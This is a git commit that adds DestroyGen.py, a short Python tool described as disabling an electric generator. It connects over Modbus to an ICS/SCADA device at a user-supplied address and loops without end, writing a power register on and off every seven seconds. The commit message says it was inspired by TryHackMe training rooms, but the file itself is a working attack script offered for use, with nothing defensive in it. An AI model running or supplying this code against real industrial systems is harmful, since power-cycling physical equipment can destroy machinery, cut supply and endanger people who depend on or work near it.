c506ca1d67fecfc9445378a33473159658c43fde
Anthony Rose <77029994+Anthony-Rose@users.noreply.github.com>
2023-01-06 11:26:30 -0800

    Create DestroyGen.py
    Python command-line tool that utilizes the PyModBus library to disable an electric generator via the power bit on an ICS/SCADA registry.  The tool takes the ip, port, and power registry bit of a ICS/SCADA server in order to cycle the power at 7 second increments.  I was inspired to write this tool after completing the ICS/SCADA rooms on TryHackMe.

---
+++ DestroyGen.py
@@ -0,0 +1,22 @@
+#!/usr/bin/env python3
+
+import sys
+import time
+from pymodbus.client.sync import ModbusTcpClient as ModbusClient
+from pymodbus.exceptions import ConnectionException
+
+#retrieving the IP and port of the registry from the user
+ip = sys.argv[1]
+port = int(sys.argv[2])
+registry = int(sys.argv[3])
+value = True
+
+#this loop starts the generator and stops it after max speed is achieved
+while True:
+    client = ModbusClient(ip, port)
+    client.connect()
+    client.write_register(registry, value)
+    print("Cycling power...")
+    print("On") if value == True else print("Off")
+    time.sleep(7)
+    value = not value
